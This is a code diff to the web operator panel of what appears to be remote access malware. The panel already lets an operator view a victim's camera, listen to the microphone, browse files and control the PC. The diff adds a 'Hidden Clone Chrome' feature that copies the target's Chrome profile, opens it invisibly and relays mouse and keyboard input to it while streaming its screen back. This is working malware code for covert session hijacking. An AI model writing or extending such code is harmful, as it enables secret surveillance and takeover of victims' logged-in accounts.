@@ -23,6 +23,7 @@
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
         <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
         <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
+        <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens it invisibly.">🕵️ Hidden Clone Chrome</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
@@ -70,6 +71,7 @@
     </div>
 
     <video id="preview-video" tabindex="0" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black; outline: none;"></video>
+    <img id="hidden-chrome-img" tabindex="0" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #9c27b0; border-radius: 8px; background: black; outline: none; cursor: crosshair;">
     <br>
     <button id="backBtn" class="hidden" style="margin-top:20px; background: #dc3545;">Back to PC List</button>
 
@@ -151,6 +153,7 @@
             // Show the appropriate default view (Neither is default now, all OFF)
             document.getElementById('controls').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('hidden-chrome-img').classList.add('hidden');
             document.getElementById('file-browser').classList.add('hidden');
             
             document.getElementById('backBtn').classList.remove('hidden');
@@ -183,6 +186,11 @@
                 document.getElementById('preview-video').classList.add('hidden');
             } else if (activeType === 'files') {
                 document.getElementById('file-browser').classList.add('hidden');
+            } else if (activeType === 'hidden-chrome') {
+                socket.emit('stop-hidden-chrome', activeTarget);
+                document.getElementById('remote-tools').classList.add('hidden');
+                document.getElementById('hidden-chrome-img').src = "";
+                document.getElementById('hidden-chrome-img').classList.add('hidden');
             }
         }
 
@@ -284,6 +292,26 @@
             stopCurrentActive();
             document.getElementById('preview-video').classList.add('hidden');
             document.getElementById('title').innerText = "Viewing Options for: " + activeTarget;
+        });
+
+        document.getElementById('viewHiddenChromeBtn').onclick = () => {
+            if (activeType === 'hidden-chrome') return;
+            if (!confirm("This will copy the target's Chrome Profile and open it invisibly in the background. It might take 5-10 seconds to load. Proceed?")) return;
+            
+            stopCurrentActive();
+            activeType = 'hidden-chrome';
+            document.getElementById('hidden-chrome-img').classList.remove('hidden');
+            document.getElementById('remote-tools').classList.remove('hidden'); // Allow sending text
+            document.getElementById('title').innerText = "Starting Hidden Chrome (Please wait...): " + activeTarget;
+            socket.emit('request-hidden-chrome', activeTarget);
+        };
+
+        socket.on('hidden-chrome-frame', (frameBase64) => {
+            if (activeType !== 'hidden-chrome') return;
+            document.getElementById('hidden-chrome-img').src = "data:image/jpeg;base64," + frameBase64;
+            if (document.getElementById('title').innerText.includes("Starting")) {
+                document.getElementById('title').innerText = "Hidden Clone Chrome: " + activeTarget;
+            }
         });
 
         document.getElementById('listenMicBtn').onclick = () => {
@@ -545,6 +573,7 @@
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('hidden-chrome-img').classList.add('hidden');
             document.getElementById('file-browser').classList.add('hidden');
             document.getElementById('chrome-list-container').classList.add('hidden');
             document.getElementById('controls').classList.add('hidden');
@@ -746,13 +775,81 @@
         document.getElementById('sendTextBtn').onclick = () => {
             const txt = document.getElementById('remoteText').value;
             if (txt) {
-                socket.emit('remote-action', { 
-                    targetId: activeTarget, 
-                    action: { type: 'type', text: txt } 
-                });
+                if (activeType === 'hidden-chrome') {
+                    for (let i=0; i<txt.length; i++) {
+                        socket.emit('hidden-chrome-action', { 
+                            targetId: activeTarget, 
+                            action: { type: 'type', text: txt[i] } 
+                        });
+                    }
+                } else {
+                    socket.emit('remote-action', { 
+                        targetId: activeTarget, 
+                        action: { type: 'type', text: txt } 
+                    });
+                }
                 document.getElementById('remoteText').value = "";
             }
         };
+
+        // --- Hidden Chrome Events ---
+        const hiddenImg = document.getElementById('hidden-chrome-img');
+
+        let lastHiddenMoveTime = 0;
+        hiddenImg.onmousemove = (e) => {
+            if (activeType !== 'hidden-chrome') return;
+            const now = Date.now();
+            if (now - lastHiddenMoveTime < 60) return;
+            lastHiddenMoveTime = now;
+            
+            const coords = mapCoordinates(e, e.target);
+            socket.emit('hidden-chrome-action', { 
+                targetId: activeTarget, 
+                action: { type: 'move', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+            });
+        };
+
+        hiddenImg.onclick = (e) => {
+            if (activeType !== 'hidden-chrome') return;
+            hiddenImg.focus();
+            const coords = mapCoordinates(e, e.target);
+            socket.emit('hidden-chrome-action', { 
+                targetId: activeTarget, 
+                action: { type: 'click', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+            });
+        };
+
+        hiddenImg.oncontextmenu = (e) => {
+            if (activeType !== 'hidden-chrome') return;
+            e.preventDefault();
+            hiddenImg.focus();
+            const coords = mapCoordinates(e, e.target);
+            socket.emit('hidden-chrome-action', { 
+                targetId: activeTarget, 
+                action: { type: 'rclick', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+            });
+        };
+
+        hiddenImg.onwheel = (e) => {
+            if (activeType !== 'hidden-chrome') return;
+            e.preventDefault();
+            const amount = e.deltaY;
+            socket.emit('hidden-chrome-action', { 
+                targetId: activeTarget, 
+                action: { type: 'scroll', amount: amount, x: 640, y: 360 } 
+            });
+        };
+
+        hiddenImg.addEventListener('keydown', (e) => {
+            if (activeType !== 'hidden-chrome') return;
+            e.preventDefault();
+            
+            let keyToSend = e.key;
+            socket.emit('hidden-chrome-action', { 
+                targetId: activeTarget, 
+                action: { type: 'type', text: keyToSend } 
+            });
+        });
 
         // WebRTC Signaling for Camera clients
         socket.on('offer', async (data) => {
